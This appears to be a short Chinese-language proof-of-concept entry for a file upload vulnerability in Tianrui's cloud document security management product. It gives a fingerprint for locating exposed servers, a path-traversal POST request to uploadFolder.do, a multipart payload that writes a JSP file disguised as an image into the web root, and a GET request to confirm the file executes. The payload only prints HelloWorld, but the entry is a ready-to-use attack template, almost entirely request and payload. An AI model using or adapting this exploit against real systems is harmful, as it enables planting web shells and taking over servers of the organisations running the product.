# 天锐绿盘云文档安全管理uploadFolder存在文件上传漏洞

- **系统**：天锐绿盾　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`body="/lddsm/"`
- **请求**：`POST /lddsm/service/../admin/activiti/uploadFolder.do?taskId=../webapps/ROOT/&relativepath=1&path=1 HTTP/1.1`
- **关键头**：`Content-Length: [calculated_length]`　`Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXqK9dR2y…`

**请求体 / payload**
```
------WebKitFormBoundaryXqK9dR2yTv7wNpLm
Content-Disposition: form-data; name="file"; filename="hello.jsp"
Content-Type: image/png
<% out.println("HelloWorld");%>
------WebKitFormBoundaryXqK9dR2yTv7wNpLm--
GET /hello.jsp HTTP/1.1
Host:
```
- **预期**：200　|　—